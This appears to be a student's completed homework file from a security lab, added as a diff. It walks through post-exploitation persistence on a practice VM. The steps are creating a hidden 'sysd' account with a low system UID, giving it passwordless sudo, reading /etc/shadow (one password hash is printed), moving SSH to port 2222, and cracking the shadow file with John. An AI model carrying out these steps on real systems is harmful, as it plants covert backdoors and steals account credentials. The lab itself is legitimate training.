@@ -1,0 +1,73 @@
+Advanced Bash - Owning the System
+Please edit this file by adding the solution commands on the line below the prompt.
+Save and submit the completed file for your homework submission.
+Step 1: Shadow People
+	1.	Create a secret user named sysd. Make sure this user doesn't have a home folder created:   
+	◦	Your solution command here:$ adduser --no-create-home sysd 
+	2.	Give your secret user a password:   
+	◦	Your solution command here: $ passwd sysd 
+	◦	Enter whatever password you want the sysd user to have  
+	3.	Give your secret user a system UID < 1000:   
+	◦	Your solution command here:nano /etc/passwd 
+	◦	Give UID 111 less than a thousand  
+	◦	sysd:x:111:1007:,,,:/home/sysd:/bin/bash 
+	4.	Give your secret user the same GID:   
+	◦	Your solution command here: nano /etc/passwd 
+	◦	Give GID the same 111 less than a thousand sysd:x:111:111:,,,:/home/sysd:/bin/bash 
+This is a snap shot of the last nano file on /etc/passwd
+	•	vboxadd:x:999:1::/var/run/vboxadd:/bin/false 
+	•	vagrant:x:300:300::/home/vagrant:/bin/bash 
+	•	student:x:1001:1001::/home/student:/bin/bash 
+	•	mitnik:x:1002:1002::/home/mitnik:/bin/bash 
+	•	babbage:x:1003:1003::/home/babbage:/bin/bash 
+	•	lovelace:x:1004:1004::/home/lovelace:/bin/bash 
+	•	stallman:x:1005:1005::/home/stallman:/bin/bash 
+	•	turing:x:1006:1006::/home/turing:/bin/bash 
+	•	sysd:x:111:111:,,,:/home/sysd:/bin/bash 
+
+	5.	Give your secret user full sudo access without the need for a password:   
+	◦	Your solution command here: $ visudo 
+
+
+
+	6.	Test that sudo access works without your password:   Your bash commands here:  
+$ sudo -l
+Matching Defaults entries for sysd on scavenger-hunt:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+User sysd may run the following commands on scavenger-hunt:
+    (ALL) NOPASSWD: ALL
+To check if i have sudo access : tail /etc/shadow
+tail: cannot open '/etc/shadow' for reading: Permission denied
+This shows i need sudo privileges 
+Then i use: sudo tail /etc/shadow
+sysadmin:$5$ClxpOL1OCPV$wG5s1DiVgsC2Ye34aFSI0LzABPompLu9DP34ZztvgR6:18387:0:99999:7:::
+vboxadd:!:18213::::::
+vagrant:*:18387:0:99999:7:::
+Now I can access the shadow files with sudo privileges !!!
+
+
+  
+Step 2: Smooth Sailing
+	1.	Edit the sshd_config file: nano /etc/ssh/sshd_config Uncoment #Port 22 to  
+Port 2222
+Save changes 
+root@scavenger-hunt:/# systemctl reload sshd
+root@scavenger-hunt:/# ssh -p 2222 sysd@192.168.6.105
+Enter sysd password 
+
+  Your bash commands here  
+Step 3: Testing Your Configuration Update
+	1.	Restart the SSH service:   
+	◦	Your solution command here:$ systemctl restart ssh 
+	2.	Exit the root account:   
+	◦	Your solution command here: $ exit  
+	3.	SSH to the target machine using your sysd account and port 2222:   
+	◦	Your solution command here:ssh sysd@192.168.6.105 -p 2222 
+	4.	Use sudo to switch to the root user:   
+	◦	Your solution command here: $sudo su 
+Step 4: Crack All the Passwords
+	1.	SSH back to the system using your sysd account and port 2222:   
+	◦	Your solution command here:ssh sysd@192.168.6.105 -p 2222 
+	2.	Escalate your privileges to the root user. Use John to crack the entire /etc/shadow file:   
+	◦	Your solution command here: $sudo su 
+Then $john /etc/shadow 
